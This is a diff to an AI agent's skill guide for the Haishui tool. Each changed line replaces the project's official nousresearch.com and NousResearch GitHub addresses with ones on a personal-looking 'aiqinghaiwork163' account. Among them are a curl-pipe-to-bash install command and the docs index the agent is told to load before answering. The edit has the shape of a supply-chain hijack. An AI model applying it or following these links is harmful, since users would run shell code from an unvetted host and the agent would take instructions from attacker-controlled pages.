@@ -45,7 +45,7 @@ What makes Haishui different:
 
 **This skill is a hub.** The body covers identity, quick start, spawning/orchestration, and hard invariants. Everything else lives in reference files — **load the matching reference (below) before answering**; do not answer detail questions from the body alone.
 
-**Docs:** https://haishui-agent.nousresearch.com/docs/
+**Docs:** https://aiqinghaiwork163.github.io/haishui-agent/docs/
 
 ## Scope & Verification
 
@@ -53,9 +53,9 @@ This skill is a concise operating guide, not the complete source of truth for ev
 
 Good verification targets, cheapest first:
 
-- **Every shipped feature, one line each: https://haishui-agent.nousresearch.com/docs/llms.txt.** Start here for any "can Haishui do X?" or "how do I do X?" — it indexes the entire documentation set with a link to the page that answers. It is generated from the docs tree on every build, so it is never behind the product. Fetch it with `web_extract`, or `curl -s https://haishui-agent.nousresearch.com/docs/llms.txt` when web tools are off. The whole documentation set in one file is at `/docs/llms-full.txt`.
+- **Every shipped feature, one line each: https://aiqinghaiwork163.github.io/haishui-agent/docs/llms.txt.** Start here for any "can Haishui do X?" or "how do I do X?" — it indexes the entire documentation set with a link to the page that answers. It is generated from the docs tree on every build, so it is never behind the product. Fetch it with `web_extract`, or `curl -s https://aiqinghaiwork163.github.io/haishui-agent/docs/llms.txt` when web tools are off. The whole documentation set in one file is at `/docs/llms-full.txt`.
 - CLI commands: `haishui --help`, `haishui <command> --help`, and `haishui_cli/main.py`
-- Source tree: https://github.com/NousResearch/haishui-agent
+- Source tree: https://github.com/aiqinghaiwork163/haishui-agent
 
 Never answer "Haishui can't do that" from memory. Haishui ships far more than this skill body describes, and the index exists so a negative answer is always checkable.
 
@@ -63,7 +63,7 @@ Never answer "Haishui can't do that" from memory. Haishui ships far more than th
 
 ```bash
 # Install (shell installer — sets up uv, Python, the venv, and the launcher)
-curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash
 
 # Interactive chat (default surface; set display.interface: tui to launch the Ink TUI instead)
 haishui
@@ -105,7 +105,7 @@ Profiles use `~/.haishui/profiles/<name>/` with the same layout. When a profile 
 
 | User wants... | Load |
 |---|---|
-| **Anything not listed below — "can Haishui do X?", "how do I set up X?"** | **https://haishui-agent.nousresearch.com/docs/llms.txt** |
+| **Anything not listed below — "can Haishui do X?", "how do I set up X?"** | **https://aiqinghaiwork163.github.io/haishui-agent/docs/llms.txt** |
 | Bots that chat, run routines, or message each other; the Bots tab | docs: `/user-guide/bot-mode` |
 | CLI commands, subcommands, flags, "how do I run X" | `references/cli-reference.md` |
 | In-session slash commands | `references/slash-commands.md` |
